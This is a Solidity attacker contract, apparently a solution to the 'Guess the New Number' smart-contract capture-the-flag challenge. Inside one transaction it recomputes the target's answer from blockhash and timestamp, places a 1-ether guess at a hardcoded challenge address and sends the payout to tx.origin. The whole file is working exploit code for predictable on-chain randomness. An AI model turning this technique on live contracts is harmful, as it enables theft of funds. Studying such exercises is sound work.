// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract GuessTheNewNumberAttacker {
    //

    function guess() external payable {
        require(msg.value >= 1 ether, "Not enough funds");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(0x4d052C540D6Cf980D42f560E6152f4845A1a7A3E);
        challenge.guess{value: 1 ether}(answer);

        // require(challenge.isComplete(), "Challenge not complete");
        require(address(this).balance >= 2 ether, "Challenge not complete");

        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface GuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}
